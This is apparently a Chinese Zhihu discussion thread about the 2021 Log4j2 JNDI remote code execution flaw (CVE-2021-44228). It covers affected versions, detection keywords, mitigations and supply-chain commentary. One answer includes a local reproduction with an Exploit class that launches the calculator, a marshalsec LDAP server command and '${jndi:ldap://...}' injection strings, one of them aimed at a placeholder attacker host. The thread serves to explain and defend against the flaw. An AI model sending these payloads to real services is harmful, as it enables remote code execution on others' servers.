+<p>可以说是灾难性的漏洞，比之前的 fastjson 和 shiro 还要严重，这个漏洞估计在之后三四年内还会继续存在…. 不说了该应急去了</p>
+<h3 id=知乎用户-老无所依-发表>知乎用户 老无所依 发表</h3>
+<h2 id=写-java-的的程序员-99-都不考虑-java-的安全机制>写 java 的的程序员, 99% 都不考虑 java 的安全机制.</h2>
+<p>1. 启动 java 的安全管理器.<br>
+2. 配置执行权限.<br>
+3. 配置执行的策略.</p>
+<p>不管你依赖什么 jar 包, 都不用担心了.</p>
+<p>突然想要一件事&mldr;&mldr;&mldr;&mldr;.</p>
+<p>会不会导致打击开源软件的活动?</p>
+<p>这可是 &ldquo;超级大漏洞&rdquo;, 可以窃取数据, 结合最近的几个 &ldquo;活动&rdquo;, 未来不知道会不会有决策, 对开源软件进行打击, 尤其是境外开源&mldr;&mldr;</p>
+<h3 id=知乎用户-gwb-发表>知乎用户 gwb 发表</h3>
+<p>再再再一次科普，软件行业的基本矛盾，是软件开发完成以后维护成本几乎为 0，和老板不得不给员工发工资之间的矛盾。基本矛盾可以解释软件行业独有的一切乱象。</p>
+<p>日志库本来是一个比较小的东西，但是这个员工写完这个库之后就能躺着领一辈子工资了吗？老板肯定不想这样，就只能让员工不停地去给库加功能，不能让他闲下来。</p>
+<p>最终我们看到，这个库变成了一个大而全的怪物。普通人用到的功能连十分之一都不到，它的全部功能约等于一个编程语言。</p>
+<p>类似的话我在 qt 相关回答也说过，一个 qt 程序 30M 空间起步，如何裁剪发布体积居然会成为一个问题。qt 不仅是界面库，还包含了线程网络数据库多媒体等等，俨然一个小的操作系统。</p>
+<p>然而这种无尽扩张能解决问题基本矛盾吗吗？显然是不能的。哪怕 log4j 真写成了脚本语言，哪怕 qt 真成了操作系统，员工的工资该发还得发，该让员工干活还得让他干活。</p>
+<p>没活怎么办？放心，总会有的。这不，出问题了，活不就来了吗？</p>
+<p>/* 甚至可以名正言顺把员工开除 */</p>
+<h3 id=知乎用户-lego-发表>知乎用户 lego 发表</h3>
+<p>这一堆 src 发的连续通告已经够说明问题了</p>
+<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAyCAYAAAAeP4ixAAACbklEQVRoQ+2aMU4dMRCGZw6RC1CSSyQdLZJtKQ2REgoiRIpQkCYClCYpkgIESQFIpIlkW+IIcIC0gUNwiEFGz+hlmbG9b1nesvGW++zxfP7H4/H6IYzkwZFwQAUZmpJVkSeniFJKA8ASIi7MyfkrRPxjrT1JjZ8MLaXUDiJuzwngn2GJaNd7vyP5IoIYY94Q0fEQIKIPRGS8947zSQTRWh8CwLuBgZx479+2BTkHgBdDAgGAC+fcywoyIFWqInWN9BSONbTmFVp/AeA5o+rjKRJ2XwBYRsRXM4ZXgAg2LAPzOCDTJYQx5pSIVlrC3EI45y611osMTHuQUPUiYpiVooerg7TWRwDAlhSM0TuI+BsD0x4kGCuFSRVzSqkfiLiWmY17EALMbCAlMCmI6IwxZo+INgQYEYKBuW5da00PKikjhNNiiPGm01rrbwDwofGehQjjNcv1SZgddALhlJEgwgJFxDNr7acmjFLqCyJuTd6LEGFttpmkYC91Hrk3s1GZFERMmUT01Xv/sQljjPlMRMsxO6WULwnb2D8FEs4j680wScjO5f3vzrlNJszESWq2LYXJgTzjZm56MCHf3zVBxH1r7ftU1splxxKYHEgoUUpTo+grEf303rPH5hxENJqDKQEJtko2q9zGeeycWy3JhpKhWT8+NM/sufIhBwKI+Mta+7pkfxKMtd8Qtdbcx4dUQZcFCQ2I6DcAnLUpf6YMPxhIDDOuxC4C6djoQUE6+tKpewWZ1wlRkq0qUhXptKTlzv93aI3jWmE0Fz2TeujpX73F9TaKy9CeMk8vZusfBnqZ1g5GqyIdJq+XrqNR5AahKr9CCcxGSwAAAABJRU5ErkJggg==" alt></p>
+<p>朋友圈也是杀疯了</p>
+<p>来让我们猜猜哪几张图是可实现的</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic2.zhimg.com/v2-d91c1669163031f3c8d5b43ff48abd32_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAyCAYAAAAeP4ixAAACbklEQVRoQ+2aMU4dMRCGZw6RC1CSSyQdLZJtKQ2REgoiRIpQkCYClCYpkgIESQFIpIlkW+IIcIC0gUNwiEFGz+hlmbG9b1nesvGW++zxfP7H4/H6IYzkwZFwQAUZmpJVkSeniFJKA8ASIi7MyfkrRPxjrT1JjZ8MLaXUDiJuzwngn2GJaNd7vyP5IoIYY94Q0fEQIKIPRGS8947zSQTRWh8CwLuBgZx479+2BTkHgBdDAgGAC+fcywoyIFWqInWN9BSONbTmFVp/AeA5o+rjKRJ2XwBYRsRXM4ZXgAg2LAPzOCDTJYQx5pSIVlrC3EI45y611osMTHuQUPUiYpiVooerg7TWRwDAlhSM0TuI+BsD0x4kGCuFSRVzSqkfiLiWmY17EALMbCAlMCmI6IwxZo+INgQYEYKBuW5da00PKikjhNNiiPGm01rrbwDwofGehQjjNcv1SZgddALhlJEgwgJFxDNr7acmjFLqCyJuTd6LEGFttpmkYC91Hrk3s1GZFERMmUT01Xv/sQljjPlMRMsxO6WULwnb2D8FEs4j680wScjO5f3vzrlNJszESWq2LYXJgTzjZm56MCHf3zVBxH1r7ftU1splxxKYHEgoUUpTo+grEf303rPH5hxENJqDKQEJtko2q9zGeeycWy3JhpKhWT8+NM/sufIhBwKI+Mta+7pkfxKMtd8Qtdbcx4dUQZcFCQ2I6DcAnLUpf6YMPxhIDDOuxC4C6djoQUE6+tKpewWZ1wlRkq0qUhXptKTlzv93aI3jWmE0Fz2TeujpX73F9TaKy9CeMk8vZusfBnqZ1g5GqyIdJq+XrqNR5AahKr9CCcxGSwAAAABJRU5ErkJggg==" alt></p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic3.zhimg.com/v2-f69c1e4153011fef29467c328ed03068_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic1.zhimg.com/v2-c0b434772d79678789ba6df22ef4a0f9_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic1.zhimg.com/v2-856483d8da2f9e8461f3a45ba6b3dc27_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic1.zhimg.com/v2-0d10e137da95b8200ecf75a9d65c0869_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic1.zhimg.com/v2-f4747e6111538068eefda6eac5e56e34_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic2.zhimg.com/v2-53e9700fbc0fc2e41cc165b69e15cf36_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic1.zhimg.com/v2-c27c42b6a3fd5f09a1bfab8475a8cfb2_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p>PS：</p>
+<p>可惜最近研究的目标 tm 的用 println 来调试</p>
+<p>完美避开漏洞</p>
+<h3 id=知乎用户-想要的生活-发表>知乎用户 想要的生活​ 发表</h3>
+<p>昨天刚刚躺下被窝都还没焐热，就接到领导一通电话，一个翻身，披上外套就往公司跑去。</p>
+<p>到了公司，好家伙，小伙伴都到齐了，开了个简短的小会，马上吭哧吭哧的撸起袖子就开干了。</p>
+<p>撸了一天，终于把他这个坑给填上了，这里给大家总结下</p>
+<h2 id=背景>背景</h2>
+<p>在 12 月 9 日晚间出现了 Apache Log4j2 <a href="https://www.zhihu.com/search?q=%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22%3A%22article%22%2C%22sourceId%22%3A443535281%7D">远程代码执行漏洞</a>攻击代码。该漏洞利用无需特殊配置，经多方验证，Apache Struts2、Apache Solr、Apache Druid、Apache Flink 等均受影响。</p>
+<p>Apache Log4j2 是一款流行的 Java 日志框架，被大量的公司所采用，建议抓紧自查是否受漏洞影响，并尽快升级新版本。<a href="https://link.zhihu.com/?target=https%3A//logging.apache.org/log4j/log4j-2.3/manual/lookups.html%23JndiLookup">Log4j - Log4j 2 Lookups - Apache Log4j 2</a>Apache Log4j2 是一款流行的 Java 日志框架，被大量的公司所采用，建议抓紧自查是否受漏洞影响，并尽快升级新版本。</p>
+<p><strong>为啥说这个漏洞危害大呢？</strong></p>
+<p>打个不恰当的比方，就比如小偷（黑客）偶然间知道了你家备用钥匙藏在了门口的地毯（后门 - 这次的漏洞）上，趁你白天不在家（非值守时间，比如半夜），就可以随意进入你家（你的服务器），随意耍。</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pica.zhimg.com/80/v2-002380ea84994ade55f3945044b97c8b_720w.jpg%3Fsource%3D1940ef5c" alt></p>
+<p>总体来说和 SQL 注入是类似的，用户的数据中包含一些特殊的代码，未被过滤，打到后端造成了一些意外情况，比如这次的，就可以远程执行相关的代码，比如下载些服务器的敏感信息啥的。而且这次的漏洞使用门槛也比较低，所以被认定为影响广泛的高危漏洞。</p>
+<p>就连某度都中招了</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pica.zhimg.com/v2-8ba1e2f32e59c5cb9589aa1bdfb9b4ad_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p>不过今天再试，是已经临时堵上了</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic1.zhimg.com/v2-5a1f9d07155c488b09fb5eb82bc47389_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<h2 id=漏洞详情-1><strong>漏洞详情</strong></h2>
+<p>Apache Log4j <a href="https://www.zhihu.com/search?q=%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A2265606581%7D">远程代码执行漏洞</a> 严重程度: 严重由于 Apache Log4j2 某些功能存在<a href="https://www.zhihu.com/search?q=%E9%80%92%E5%BD%92%E8%A7%A3%E6%9E%90&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A2265606581%7D">递归解析</a>功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置漏洞情况分析：Apache Log4j 是一个基于 Java 的日志记录组件。Apache Log4j2 是 Log4j 的升级版本，通过重写 Log4j 引入了丰富的功能特性。该<a href="https://www.zhihu.com/search?q=%E6%97%A5%E5%BF%97%E7%BB%84%E4%BB%B6&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A2265606581%7D">日志组件</a>被广泛应用于业务系统开发，用以记录程序输入输出日志信息。2021 年 11 月 24 日，阿里云安全团队向 Apache 官方报告了 Apache Log4j2 远程代码执行漏洞。由于 <a href="https://www.zhihu.com/search?q=Log4j2%E7%BB%84%E4%BB%B6&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A2265606581%7D">Log4j2 组件</a>在处理程序日志记录时存在 JNDI 注入缺陷，未经授权的攻击者利用该漏洞，可向目标服务器发送精心构造的恶意数据，触发 <a href="https://www.zhihu.com/search?q=Log4j2%E7%BB%84%E4%BB%B6%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A2265606581%7D">Log4j2 组件解析缺陷</a>，实现目标服务器的任意代码执行，获得目标服务器权限。<br>
+<strong>漏洞编号：CVE-2021-44228</strong><br>
+**等级：**高危，该漏洞影响范围极广，危害极大。<br>
+**CVSS 评分：**10（最高级）<strong>漏洞状态：</strong></p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic3.zhimg.com/80/v2-191485af75f5772959269f489f47f283_720w.jpg%3Fsource%3D1940ef5c" alt></p>
+<p><strong>受影响的版本：</strong></p>
+<p>Apache log4j2 2.0 - 2.14.1 版本均受影响。</p>
+<p>不要以为没有升级 log4j 1.x 就没有事了，一样的。</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic1.zhimg.com/v2-d83a7128b081f9f5fc062e5c8a67cb38_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p>详情看：<a href="https://link.zhihu.com/?target=https%3A//github.com/apache/logging-log4j2/pull/608">Restrict LDAP access via JNDI by rgoers · Pull Request #608 · apache/logging-log4j2</a></p>
+<p>**安全版本：**Apache log4j-2.15.0</p>
+<h2 id=攻击排查-1>攻击排查</h2>
+<p>1、攻击者在利用前通常采用 dnslog 方式进行扫描、探测，常见的漏洞利用方式可通过应用系统报错日志中的 &ldquo;javax.naming.CommunicationException&rdquo;、&ldquo;javax.naming.NamingException: problem generating object using object factory&rdquo;、&ldquo;Error looking up JNDI resource&rdquo; 关键字进行排查。<br>
+2、攻击者发送的数据包中可能存在 &ldquo;${jndi:}&rdquo; 字样</p>
+<p>3、通过流量监测设备监控是否有相关 DNSLog 域名的请求</p>
+<h2 id=漏洞分析-1>漏洞分析</h2>
+<p>此次漏洞的出现，正是由用于 Log4j 2 提供的 lookup 功能造成的，该功能允许开发者通过一些协议去读取相应环境中的配置。但在实现的过程中，并未对输入进行严格的判断，从而造成漏洞的发生。</p>
+<p><a href="https://link.zhihu.com/?target=https%3A//logging.apache.org/log4j/log4j-2.3/manual/lookups.html%23JndiLookup">Log4j - Log4j 2 Lookups - Apache Log4j 2</a></p>
+<p>漏洞示例代码</p>
+<pre tabindex=0><code>import org.apache.logging.log4j.LogManager;
+import org.apache.logging.log4j.Logger;
+public class Main {
+    private static final Logger logger = LogManager.getLogger();
+    public static void main(String\[\] args) {
+        logger.error(&quot;${jndi:ldap://xxxip:1389/#Exploit}&quot;);
+    }
+}
+
+</code></pre><p>简单来说，就是在打印日志时，如果发现日志内容中包含关键词 ${，那么这个里面包含的内容会当做变量来进行替换，导致攻击者可以任意执行命令。详细漏洞披露可查看：<a href="https://link.zhihu.com/?target=https%3A//issues.apache.org/jira/projects/LOG4J2/issues/LOG4J2-3201%3Ffilter%3Dallissues">https://issues.apache.org/jira/projects/LOG4J2/issues/LOG4J2-3201?filter=allissues</a></p>
+<h2 id=修复建议-4><strong>修复建议</strong></h2>
+<p>据 Apache 官方最新信息显示，release 页面上已经更新了 Log4j 2.15.0 版本，<strong>主要是那个 <a href="https://www.zhihu.com/search?q=log4j-core&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A2266908669%7D">log4j-core</a> 包，漏洞就是在这个包里产生的，如果你的程序有用到，尽快紧急升级。</strong></p>
+<p><strong>临时方案</strong></p>
+<p>若相关用户暂时无法进行升级操作，可先用下列措施进行临时缓解：</p>
+<p>1、添加 jvm 启动参数:-Dlog4j2.formatMsgNoLookups=true</p>
+<p>2、在应用 classpath 下添加 <a href="https://link.zhihu.com/?target=http%3A//log4j2.component.properties/">log4j2.component.properties</a> 配置文件，文件内容为：</p>
+<pre tabindex=0><code>log4j2.formatMsgNoLookups=true
+
+</code></pre><p>3、建议 JDK 使用 11.0.1、8u191、7u201、6u211 及以上的高版本</p>
+<p>4、限制受影响应用对外访问互联网，并在边界对 dnslog 相关域名访问进行检测。</p>
+<p>5、WAF 添加漏洞攻击代码临时拦截规则。</p>
+<p><strong>根治方案</strong></p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic1.zhimg.com/v2-f02bddf1f9d63c2b9d3d9d02cd9d8335_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p>使用最新的 2.15.0</p>
+<p>Log4j2 2.15.0 jar 包下载</p>
+<p><a href="https://link.zhihu.com/?target=http%3A//note.youdao.com/noteshare%3Fid%3Dcfdcb66f3b345dc9966907802ace298a%26sub%3DAE2FE87194014E9CAEA38474DC3F401C">Log4j2 2.15.0 下载地址及安全相关资料</a></p>
+<p>-&mdash;&mdash;&mdash;- 如何复现 &mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;</p>
+<p>有人问怎么复现，我这里加更下</p>
+<h2 id=环境>环境</h2>
+<ol>
+<li>jdk 1.8</li>
+</ol>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic3.zhimg.com/v2-847bdb3111ac0b65543a2bbd13cd5616_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p>2. Maven 依赖</p>
+<pre tabindex=0><code>&lt;dependency&gt;
+        &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;
+        &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;
+        &lt;version&gt;2.14.1&lt;/version&gt;
+&lt;/dependency&gt;
+
+</code></pre><p>3. 一个 web 服务, 我这里用的是 tomcat</p>
+<p>4. marshalsec-0.0.3-SNAPSHOT-all.jar</p>
+<h2 id=步骤>步骤</h2>
+<h3 id=创建一个-java-类>创建一个 java 类</h3>
+<pre tabindex=0><code>// 触发这个方法会拉起本地计算器
+class Exploit {
+	static {
+		System.err.println(&quot;Pwned&quot;);
+		try {
+			String cmds = &quot;calc&quot;;
+			Runtime.getRuntime().exec(cmds);
+		} catch (Exception e){
+			e.printStackTrace();
+		}
+	}
+}
+
+</code></pre><p>编译</p>
+<pre tabindex=0><code>javac Exploit.java
+
+</code></pre><p>得到：Exploit.class</p>
+<p>![](data:image/svg+xml;utf8,)</p>
+<h2 id=启动-jndi-服务>启动 Jndi 服务</h2>
+<pre tabindex=0><code>\&gt;java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://127.0.0.1:8080/#Exploit&quot; 8888
+
+</code></pre><p>观察到如下结果，即为启动成功</p>
+<pre tabindex=0><code>Listening on 0.0.0.0:8888
+
+</code></pre><p>注：<a href="https://link.zhihu.com/?target=http%3A//127.0.0.1%3A8080/%23Exploit">http://127.0.0.1:8080/#Exploit</a> 就是你启动的那个 web 容器的服务地址</p>
+<p>这里需要将上一步的 Exploit.class 丢到 web 容器中 (比如 tomcat 可以丢到 webapps/ROOT 下面)，在浏览器中访问可以触发下载即为正常。</p>
+<h3 id=编写漏洞触发类>编写漏洞触发类</h3>
+<p>创建一个 Maven 项目，编写漏洞模拟类</p>
+<pre tabindex=0><code>import org.apache.logging.log4j.LogManager;
+import org.apache.logging.log4j.Logger;
+public class Poc {
+       public static final Logger logger = LogManager.getLogger();
+       public static void main(String\[\] args) {
+              // TODO Auto-generated method stub
+              logger.error(&quot;${jndi:ldap://localhost:8888/#Exploit}&quot;);
+       }
+}
+
+</code></pre><p>这里相当于远程服务，记录日志。</p>
+<h3 id=执行-main-方法>执行 main 方法</h3>
+<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAyCAYAAAAeP4ixAAACbklEQVRoQ+2aMU4dMRCGZw6RC1CSSyQdLZJtKQ2REgoiRIpQkCYClCYpkgIESQFIpIlkW+IIcIC0gUNwiEFGz+hlmbG9b1nesvGW++zxfP7H4/H6IYzkwZFwQAUZmpJVkSeniFJKA8ASIi7MyfkrRPxjrT1JjZ8MLaXUDiJuzwngn2GJaNd7vyP5IoIYY94Q0fEQIKIPRGS8947zSQTRWh8CwLuBgZx479+2BTkHgBdDAgGAC+fcywoyIFWqInWN9BSONbTmFVp/AeA5o+rjKRJ2XwBYRsRXM4ZXgAg2LAPzOCDTJYQx5pSIVlrC3EI45y611osMTHuQUPUiYpiVooerg7TWRwDAlhSM0TuI+BsD0x4kGCuFSRVzSqkfiLiWmY17EALMbCAlMCmI6IwxZo+INgQYEYKBuW5da00PKikjhNNiiPGm01rrbwDwofGehQjjNcv1SZgddALhlJEgwgJFxDNr7acmjFLqCyJuTd6LEGFttpmkYC91Hrk3s1GZFERMmUT01Xv/sQljjPlMRMsxO6WULwnb2D8FEs4j680wScjO5f3vzrlNJszESWq2LYXJgTzjZm56MCHf3zVBxH1r7ftU1splxxKYHEgoUUpTo+grEf303rPH5hxENJqDKQEJtko2q9zGeeycWy3JhpKhWT8+NM/sufIhBwKI+Mta+7pkfxKMtd8Qtdbcx4dUQZcFCQ2I6DcAnLUpf6YMPxhIDDOuxC4C6djoQUE6+tKpewWZ1wlRkq0qUhXptKTlzv93aI3jWmE0Fz2TeujpX73F9TaKy9CeMk8vZusfBnqZ1g5GqyIdJq+XrqNR5AahKr9CCcxGSwAAAABJRU5ErkJggg==" alt></p>
+<p>在 jndi 服务运行 cmd 中可以看到一条记录：</p>
+<pre tabindex=0><code>Send LDAP reference result for #Exploit redirecting to http://127.0.0.1:8080/Exploit.class
+
+</code></pre><p>这里就成功的触发了一次远程攻击操作</p>
+<h3 id=小结>小结</h3>
+<p>大致流程如下：</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic2.zhimg.com/v2-4e5ce1690b3fdff311b0d02b0a826d46_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p>想要自己复现的，下面提供了链接，需要的自取，根据步骤复现</p>
+<p><a href="https://link.zhihu.com/?target=http%3A//note.youdao.com/noteshare%3Fid%3D323e737eb57e9779254b127ce602b184%26sub%3D8CA884618C494CF4A353947835670629">Log4j2 漏洞复现相关代码资源</a></p>
+<h3 id=知乎用户--kevin-zhang-发表>知乎用户 Kevin Zhang​ 发表</h3>
+<p>这次影响相当大：</p>
+<p>通过 Google 搜索引擎对依赖该组件的产品、其他开源组件分析后发现，有 310 个产品、开源组件依赖了 Apache Log4j2 2.14.1 的版本，包括诸多全球使用量的 Top 序列的通用开源组件，例如 Apache Struts2、Apache Solr、Apache Druid、Apache Flink 等。</p>
+<p>而 Struts2，Druid，Flink 等组件简直是互联网公司的标配。</p>
+<p>这不得不把软件供应链安全再次拿出来讲一讲了。</p>
+<p>2015 年 9 月，黑客组织利用当时通过官方渠道获取苹果 Xcode 官方版本困难的情况 , 在非官方渠道发布的 Xcode 注入病毒，导致 2500 多款使用该开发工具开发的苹果 App 被植入恶意代码，受影响的苹果 iOS 用户达 1.28 亿。<br>
+2017 年 8 月，安全研究人员发现知名电信设备制造商 Iris 生产的调制解调器存在五个安全漏洞，其中三个硬编码后门账号漏洞。由于未及时开展漏洞挖掘和修复工作，直接导致攻击者利用三个后门账号控制设备，获取 root 权限，安装新固件乃至架设僵尸网络。<br>
+2017 年 9 月，NetSarang 公司开发的安全终端模拟软件 Xmanager、Xshell、Xftp、Xlpd 等产品中包含的 <a href="https://www.zhihu.com/search?q=nssock2.dll&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A2266438180%7D">nssock2.dll</a> 模块源码被植入恶意后门。<br>
+2020 年 12 月，美国 SolarWinds 公司的 Orion 软件更新服务器上存在一个被感染的更新程序，导致美国财政部系统等约 18000 家关键基础设施、联邦机构和企业受到影响，部分受影响设备甚至可由攻击者完全操控。</p>
+<p>据 GitHub 统计，2020 年新增了 1600 万开发者用户，预计 2025 年开发者用户数将达到 1 亿，而中国开发者数量及贡献度增长已成为全球最快，预测到 2030 年，中国开发者将成为全球最大的开源群体。</p>
+<p><strong>软件定义世界，开源定义软件。</strong></p>
+<p>可怕的是，如果我们一切的国产化，都建立在开源软件的基础之上，一旦底层开源软件出现漏洞，影响范围难以估量。</p>
+<p>芯片卡脖子很难受，没有相应的软硬件，造不出芯片；</p>
+<p>开源卡脖子很可怕，当开源已经深入所有应用的方方面面，如果有一天突然断供 / 出现漏洞，如同整个软件世界的地基突然坍塌，皮之不存，毛将焉附？</p>
+<h3 id=知乎用户-王二小-发表>知乎用户 王二小 发表</h3>
+<p>看了一下</p>
+<p>典型的为功能而功能的 sb 行为</p>
+<p>估计是某些人为了凸显自己的重要性而添加一些似是而非未经过仔细思考和验证的功能</p>
+<p>软件设计是以达到最小目标为原则的基本设计 剩下的是安全安全安全！</p>
+<p>老有这种根本不懂系统设计原则的沙雕 会写代码， 但是写出来的东西表面上好看，实际能瞬间搞死一个企业</p>
+<p>不说别的， 大企鹅大阿里的数据要是因为这个泄漏， 呵呵</p>
+<p>或者某些大银行 大机构 社保？</p>
+<p>这些地方本身技术水平就没那么高，脑子里也没这个弦</p>
+<p>不靠谱的程序员真是万恶之源</p>
+<h3 id=知乎用户-左趋趋-发表>知乎用户 左趋趋​ 发表</h3>
+<p>辩证的看待是天大的好事，让一大波老旧的信息系统有了升级换代的理由和资源。</p>
+<h3 id=知乎用户-听雨轩-发表>知乎用户 听雨轩 发表</h3>
+<p>只引用了 log4j-api，没有引用 log4j-core 的，不受影响。</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic3.zhimg.com/v2-7990949262550103a66a365d16c3d110_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p><a href="https://link.zhihu.com/?target=https%3A//github.com/apache/logging-log4j2/pull/608">https://github.com/apache/logging-log4j2/pull/608</a></p>
+<h3 id=知乎用户-sheepbotany-发表>知乎用户 sheepbotany 发表</h3>
+<p>哈哈哈哈，学生党过来吃瓜。之前帮室友改项目，有一个功能是上传文件与下载文件，但是一直失败，后来发现是 log4j 下载的版本不对，所以对 log4j 的印象很深刻，log4j 在大型 java 项目中应用太广泛了。</p>
+<p>看见有人不知道为啥这个漏洞这么可怕。简单来说，我们平时看的很多页面，学校的官网页面，淘宝就是 java+php，都用到 log4jjar 包，这时因为一个文件导致出现巨大漏洞，那么这些页面就可以被随便破坏了，想破坏什么就破坏什么，游戏开挂也可以，没准修改成绩也可以。。。。。这种网站随处可见，随处可见，随处可见，破坏容易，每一秒都是损失，而且有的项目写完可能就忘了，修改都来不及。</p>
+<p>而且如果大家忘记更新，那么这种漏洞一直存在，一些氪金游戏，危。</p>
+<p>我们学校的网站有的就是 javaweb 项目，不知道会不会被攻击。</p>
+<p>不管怎么样，对程序猿来说，真的是不眠的几天。</p>
+<h3 id=知乎用户-程序猿阿朗-发表>知乎用户 程序猿阿朗​ 发表</h3>
+<p><strong>点赞</strong>再看，动力无限。Hello world : ) 微信搜「 <a href="https://link.zhihu.com/?target=https%3A//cdn.jsdelivr.net/gh/niumoo/cdn-assets/webinfo/wp.png">程序猿阿朗</a> 」。 本文 <a href="https://link.zhihu.com/?target=https%3A//github.com/niumoo/JavaNotes">Github.com/niumoo/JavaNotes</a> 和 <a href="https://link.zhihu.com/?target=https%3A//www.wdbyte.com/">未读代码网站</a> 已经收录，有很多知识点和系列文章。</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pica.zhimg.com/v2-abb9a336ed73ead57aa937b2a109b1c5_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p>2021 年 12 月 10 日凌晨前，网上曝出了 log4j 的<strong>核弹级</strong>漏洞，这种漏洞<strong>超级高危，操作简单，利用方便，适用范围广</strong>，可以直接<strong>任意代码执行</strong>，<strong>接管你的服务器</strong></p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic3.zhimg.com/80/v2-c94770dd2e4f96d1305cb5086528a8ac_720w.jpg%3Fsource%3D1940ef5c" alt></p>
+<p>此处思考曝光者<strong>凌晨曝光</strong>的原因，或许选择凌晨曝光，想着无数工程师半夜起来紧急修复，让 TA 产生了<strong>变态的快感</strong>。</p>
+<p>我知道你们是想看什么的，就是想看如何演示，不过还是先看下如何修复，提高下安全意识。</p>
+<h2 id=0x01-漏洞情况><strong>0x01. 漏洞情况</strong></h2>
+<p>Apache Log4j2 是一款优秀的 Java 日志框架。由于 Apache Log4j2 某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置。</p>
+<p>通过网上公开资料，这个漏洞的细节已经完全公开，<strong>这里简单演示，让大家了解漏洞情况，尽快安全升级。</strong></p>
+<p>根据网络公开新闻，可以梳理出以下时间脉络：</p>
+<ul>
+<li>2021 年 11 月 24 日，阿里云安全团队向 Apache 官方报告了 Apache Log4j2 远程代码执行漏洞。</li>
+<li>2021 年 12 月 06 日，log4j2 发布修复包 log4j-2.15.0-rc1.jar</li>
+<li>2021 年 12 月 10 日，log4j2 发布修复包 log4j-2.15.0-rc2.jar</li>
+<li>2021 年 12 月 10 日，阿里云安全团队发现 <strong>Apache Log4j 2.15.0-rc1 版本存在漏洞绕过</strong>，<strong>请及时更新至 Apache Log4j 2.15.0-rc2 版本</strong>。</li>
+</ul>
+<p><strong>实际受影响范围如下</strong>：</p>
+<p>Apache Log4j 2.x &lt; 2.15.0-rc2</p>
+<h2 id=0x02-安全建议><strong>0x02. 安全建议</strong></h2>
+<ol>
+<li>排查应用是否引入了 Apache log4j-core Jar 包，若存在依赖引入，且在受影响版本范围内，则可能存在漏洞影响。请尽快升级 Apache Log4j2 所有相关应用到<strong>最新的 log4j-2.15.0-rc</strong>2 版本，地址 <a href="https://link.zhihu.com/?target=https%3A//github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2%3Fspm%3Da2c4g.11174386.n2.3.36294c07iPtEP8%26file%3Dlog4j-2.15.0-rc2">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2</a></li>
+<li>升级已知受影响的应用及组件，如 spring-boot-starter-log4j2/Apache Struts2/Apache Solr/Apache Druid/Apache Flink</li>
